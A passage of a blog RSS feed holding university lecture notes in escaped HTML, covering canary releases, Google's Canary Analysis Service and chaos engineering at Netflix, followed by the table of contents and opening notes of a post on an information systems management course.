          &lt;th&gt;Row total&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Control (A)&lt;/td&gt;
          &lt;td&gt;a&lt;/td&gt;
          &lt;td&gt;b&lt;/td&gt;
          &lt;td&gt;a + b&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Treatment (B)&lt;/td&gt;
          &lt;td&gt;c&lt;/td&gt;
          &lt;td&gt;d&lt;/td&gt;
          &lt;td&gt;c + d&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;column total&lt;/td&gt;
          &lt;td&gt;a + c&lt;/td&gt;
          &lt;td&gt;b + d&lt;/td&gt;
          &lt;td&gt;a + b + c + d&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;code&gt;p = (a + b Choose a) * (c + d Choose c) / (N choose a + c)&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;canary-releases&#34; &gt;Canary Releases
&lt;span&gt;
    &lt;a href=&#34;#canary-releases&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;partial, time-limited deployment of a change in a service, followed by evaluation of the safety. Production may then be rolled forward, backward, or alert someone&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;coal mines often contain noxious gases&lt;/li&gt;
&lt;li&gt;early warning system: bring caged canary (bird) and the bird would die&lt;/li&gt;
&lt;li&gt;software releases introduces some risk and we want to minimize impact of deploying to a global userbase&lt;/li&gt;
&lt;li&gt;solution: distribute on a &lt;em&gt;canary&lt;/em&gt; channel and if it &lt;em&gt;dies&lt;/em&gt;, make sure not to roll it out further&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;decision-making&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;how to deploy partial service changes&lt;/li&gt;
&lt;li&gt;what safety metrics to collect&lt;/li&gt;
&lt;li&gt;how to compare metrics&lt;/li&gt;
&lt;li&gt;what is a &lt;em&gt;dead canary&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;https://is.gd/8xeKzf&#34;&gt;Canary Analysis Service&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Canary Analysis Service by Google that analyzes key metrics&lt;/li&gt;
&lt;li&gt;Modifying versus Analyzing production&lt;/li&gt;
&lt;li&gt;conducts an A/B test of &amp;ldquo;is the canary meaningfully worse&amp;rdquo;&lt;/li&gt;
&lt;li&gt;default tooling integration and zero configuration option
&lt;ul&gt;
&lt;li&gt;concessions in analysis quality&lt;/li&gt;
&lt;li&gt;no canary setup: rollout tool exposes canary to subset of population and remainder is the control and then asks CAS for the result&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Remote Procedure Calls are used (RPCs)&lt;/li&gt;
&lt;li&gt;API spec is that GetResult starts the analysis and blocks until complete. Since result for the same id is the same, the function is idempotent and so additional calls don&amp;rsquo;t trigger anything but return the same result&lt;/li&gt;
&lt;li&gt;Returns PASS/FAILL&lt;/li&gt;
&lt;li&gt;check: combination of canary and control time series that can eb turned into PASS/FAILL
&lt;ul&gt;
&lt;li&gt;crash rate, RPC error ratio, dataset size&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;each evaluation request has multiple trials so there are a collection of checks. all checks must PASS&lt;/li&gt;
&lt;li&gt;configuration: what is the check called, how to get the time series for said check, how to turn a time series into a verdict, additional metadata
&lt;ul&gt;
&lt;li&gt;Monarch is the source of monitoring data&lt;/li&gt;
&lt;li&gt;Abstract query turns into specialized query for particular population&lt;/li&gt;
&lt;li&gt;Common queries provided&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Coordinator
&lt;ul&gt;
&lt;li&gt;Transactionally takes ownership of an evaluations
&lt;ul&gt;
&lt;li&gt;if failed, the RPC is re-routed to the canonical coordinator&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Processes evaluations in memory&lt;/li&gt;
&lt;li&gt;Has a queue of RPCs that are awaiting the evaluation&lt;/li&gt;
&lt;li&gt;Updates the database after finishing&lt;/li&gt;
&lt;li&gt;Model component: predicted behaviours so predicted failure is not on the canary&lt;/li&gt;
&lt;li&gt;Checkpoints are made in case coordinator dies&lt;/li&gt;
&lt;li&gt;Autoconfiguration&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;chaos-engineering&#34; &gt;Chaos Engineering
&lt;span&gt;
    &lt;a href=&#34;#chaos-engineering&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;hard to predict production conditions&lt;/li&gt;
&lt;li&gt;rare environments lead to catastrophic failures&lt;/li&gt;
&lt;li&gt;improper fallback settings when service is down&lt;/li&gt;
&lt;li&gt;retry storms (improperly tuned timeouts)&lt;/li&gt;
&lt;li&gt;downstream dependency failure
&lt;ul&gt;
&lt;li&gt;leftpad incident&lt;/li&gt;
&lt;li&gt;event-stream bitcoin mining exploit&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;cascading failures&lt;/li&gt;
&lt;li&gt;What to do?
&lt;ul&gt;
&lt;li&gt;sensitivity to change&lt;/li&gt;
&lt;li&gt;mimic chaos of real world deployment environment&lt;/li&gt;
&lt;li&gt;introduce experiment of: server crashes, hard disk failures, cleaning staff knocks network cable out of server&lt;/li&gt;
&lt;li&gt;compare to steady state version&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;amp;arnumber=7436642&#34;&gt;Chaos Engineering&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Chaos monkey: randomly terminate cloud nodes. Simulate potential outages during work hours&lt;/li&gt;
&lt;li&gt;Chaos Kong: can fail an entire region of EC2 instances on AWS. Runs monthly.&lt;/li&gt;
&lt;li&gt;Failure Injection Testing (internal service failures)&lt;/li&gt;
&lt;li&gt;Premise one: collection of services are viewed as a single system&lt;/li&gt;
&lt;li&gt;Premise two: inject real-world inputs to better understand the system&lt;/li&gt;
&lt;li&gt;Netflix:
&lt;ul&gt;
&lt;li&gt;stream starts per second
&lt;ul&gt;
&lt;li&gt;varies during the day but there is intuition whether it is within the standard range of variation&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;new account signups per second&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;happy path: inputs that do not error out
&lt;ul&gt;
&lt;li&gt;not good because it does not account for real possibility of unlikable inputs&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;failures of traditional testing:
&lt;ul&gt;
&lt;li&gt;overloaded server → queue becomes longer and response slows down, and higher memory usage&lt;/li&gt;
&lt;li&gt;clients make requests to a cache that has cached a transient error&lt;/li&gt;
&lt;li&gt;integration testing required for the complex interactions
&lt;ul&gt;
&lt;li&gt;sometimes only possible in production&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;netflix runs chaos experiments continuously&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>CS 490 Information Systems Management</title>
      <link>https://blog.elijahlopez.ca/posts/university/cs-490-information-systems-management/</link>
      <pubDate>Tue, 09 May 2023 13:02:11 -0400</pubDate>
      
      <guid>https://blog.elijahlopez.ca/posts/university/cs-490-information-systems-management/</guid>
      <description>&lt;div&gt;
    &lt;h2&gt;Table of Contents&lt;/h2&gt;
    &lt;nav id=&#34;TableOfContents&#34;&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;a href=&#34;#introduction&#34;&gt;Introduction&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#the-first-system&#34;&gt;The First System&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#business-transformation&#34;&gt;Business Transformation&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#information-systems-management&#34;&gt;Information Systems Management&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#problems-with-manual-reservations&#34;&gt;Problems with Manual reservations&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#waves-of-innovation&#34;&gt;Waves of Innovation&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#software-architecture&#34;&gt;Software Architecture&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#architecting-a-solution&#34;&gt;Architecting A Solution&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#three-tier&#34;&gt;Three Tier&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#zero-client&#34;&gt;Zero Client&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#practice-3-a-weather-application&#34;&gt;Practice #3: A Weather Application&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#how-to-find-a-solution&#34;&gt;How to Find a Solution&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#revenue-model&#34;&gt;Revenue Model&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#revenue-model-and-design&#34;&gt;Revenue Model and Design&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#triton-wear&#34;&gt;Triton Wear&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#external-factors&#34;&gt;External Factors&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#internal-forces&#34;&gt;Internal Forces&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#strategies-in-the-new-work-environment&#34;&gt;Strategies in the New Work Environment&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#management-hierarchy&#34;&gt;Management Hierarchy&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#information-workers&#34;&gt;Information Workers&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#software-examples&#34;&gt;Software Examples&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#raid&#34;&gt;RAID&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#raid-0&#34;&gt;RAID 0&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#raid-1&#34;&gt;RAID 1&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#raid-10&#34;&gt;RAID 10&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#raid-5&#34;&gt;RAID 5&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#storage-area-network&#34;&gt;Storage Area Network&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#practical-exercise&#34;&gt;Practical Exercise&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#backup&#34;&gt;Backup&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#offline-backup&#34;&gt;Offline backup&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#archive&#34;&gt;Archive&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#strategic-planning&#34;&gt;Strategic Planning&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#why-planning-is-so-difficult&#34;&gt;Why Planning Is So Difficult&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#changing-world-of-planing&#34;&gt;Changing World of Planing&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#eight-planning-techniques&#34;&gt;Eight Planning Techniques&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#managing-corporate-information-resources&#34;&gt;Managing Corporate Information Resources&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#it-infrastructure&#34;&gt;IT Infrastructure&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#approaches-to-manage&#34;&gt;Approaches to Manage&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#value-chain-model&#34;&gt;Value Chain Model&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#business-process-bp&#34;&gt;Business Process (BP)&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#integration-tools&#34;&gt;Integration Tools&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#haarslev-industry&#34;&gt;Haarslev Industry&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#to-increase-microsoft-dynamics&#34;&gt;To-Increase [&amp;hellip;Microsoft Dynamics]&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#information-systems-strategic-planning&#34;&gt;Information Systems Strategic Planning&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#creating-video-games&#34;&gt;Creating Video Games&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#customer-intimacy&#34;&gt;Customer Intimacy&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#operational-excellence&#34;&gt;Operational Excellence&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#competitive-advantage&#34;&gt;Competitive Advantage&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#stand-out-firms&#34;&gt;Stand-Out Firms&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#strategic-planning-challenges&#34;&gt;Strategic Planning Challenges&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#limitations-of-traditional-strategy-making&#34;&gt;Limitations of Traditional Strategy-Making&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#moores-law&#34;&gt;Moore&amp;rsquo;s Law&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#sense-and-respond&#34;&gt;Sense and Respond&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#ibm-in-a-service-oriented-architecture&#34;&gt;IBM in a Service-Oriented Architecture&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#komatsu&#34;&gt;Komatsu&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#tools-for-business-analysis&#34;&gt;Tools for Business Analysis&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#swot-analysis&#34;&gt;SWOT Analysis&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#porters-five-force&#34;&gt;Porter&amp;rsquo;s five force&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#vc-benchmarking&#34;&gt;VC Benchmarking&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#management-issues-in-information-systems-development&#34;&gt;Management Issues in Information Systems Development&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#systems-development&#34;&gt;Systems Development&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#baseline-it-plan&#34;&gt;Baseline IT Plan&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#steering-committee&#34;&gt;Steering Committee&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#development-process&#34;&gt;Development Process&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#system-process-descriptions&#34;&gt;System Process Descriptions&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#traditional-waterfall-model&#34;&gt;Traditional Waterfall Model&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#incremental-development&#34;&gt;Incremental Development&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#project-kickoff&#34;&gt;Project Kickoff&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#system--software-design&#34;&gt;System &amp;amp; Software Design&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#development-methodologies&#34;&gt;Development Methodologies&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#software-testing-goals&#34;&gt;Software Testing Goals&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#software-testing-strategies&#34;&gt;Software Testing Strategies&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#software-testing-types&#34;&gt;Software Testing Types&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#why-do-systems-fail&#34;&gt;Why do Systems Fail&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#development-management&#34;&gt;Development Management&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#project-lifecycle&#34;&gt;Project Lifecycle&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#project-planning&#34;&gt;Project Planning&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#common-types-of-plans-fyi&#34;&gt;Common Types of Plans (FYI)&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#project-constraints&#34;&gt;Project Constraints&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#monitoring-and-control&#34;&gt;Monitoring and Control&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#metrics-classification&#34;&gt;Metrics Classification&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#cumulative-budgets-and-actual-cost&#34;&gt;Cumulative Budgets and Actual Cost&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#project-closure&#34;&gt;Project Closure&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#types-of-dependency&#34;&gt;Types of Dependency&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#managing-information-security&#34;&gt;Managing Information Security&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#what-is-information-security&#34;&gt;What is Information Security?&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#security-threats&#34;&gt;Security Threats&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#security-management&#34;&gt;Security Management&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#equifax&#34;&gt;Equifax&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#five-pillars&#34;&gt;Five Pillars&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#technical-countermeasures&#34;&gt;Technical Countermeasures&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#steganography&#34;&gt;Steganography&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#virtual-private-network-vpn&#34;&gt;Virtual Private Network (VPN)&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#intranet&#34;&gt;Intranet&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#management-countermeasures&#34;&gt;Management Countermeasures&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#examples&#34;&gt;Examples&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#economic-evaluation-of-security-measures&#34;&gt;Economic Evaluation of Security Measures&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#risk-management&#34;&gt;RIsk Management&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#centric&#34;&gt;Centric&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#information-centric-decision-making&#34;&gt;Information-Centric Decision Making&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/nav&gt;
&lt;/div&gt;

&lt;h2 id=&#34;introduction&#34; &gt;Introduction
&lt;span&gt;
    &lt;a href=&#34;#introduction&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Why are we building things.&lt;/li&gt;
&lt;li&gt;A system consists of components&lt;/li&gt;
&lt;li&gt;Ahmed Ibrahim: DC 2133 (Tuesday, Thursday after lecture)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;the-first-system&#34; &gt;The First System
&lt;span&gt;
    &lt;a href=&#34;#the-first-system&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;For 4000 years, writing was the only information technnology&lt;/p&gt;
&lt;p&gt;Data vs. Information&lt;/p&gt;
&lt;p&gt;data: raw facts before organization into an understandable form&lt;/p&gt;
&lt;p&gt;information: data that has been shaped into a meaningful and useful form for human beings&lt;/p&gt;
&lt;h3 id=&#34;business-transformation&#34; &gt;Business Transformation
&lt;span&gt;
    &lt;a href=&#34;#business-transformation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;automation and digitization&lt;/li&gt;
&lt;li&gt;data-driven decision-making&lt;/li&gt;
&lt;li&gt;enhanced customer engagement&lt;/li&gt;
&lt;li&gt;improved collaboration and connectivity&lt;/li&gt;
&lt;li&gt;disruption of traditional industries through new business models&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;information-systems-management&#34; &gt;Information Systems Management
&lt;span&gt;
    &lt;a href=&#34;#information-systems-management&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;What are we doing after we build a system.&lt;/p&gt;
&lt;h4 id=&#34;advantages&#34; &gt;Advantages
&lt;span&gt;
    &lt;a href=&#34;#advantages&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Survival&lt;/li&gt;
&lt;li&gt;Competitive advantages&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;success&#34; &gt;Success
&lt;span&gt;
    &lt;a href=&#34;#success&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Correct tech, tools, processes, people, networks&lt;/p&gt;
&lt;h3 id=&#34;problems-with-manual-reservations&#34; &gt;Problems with Manual reservations
&lt;span&gt;
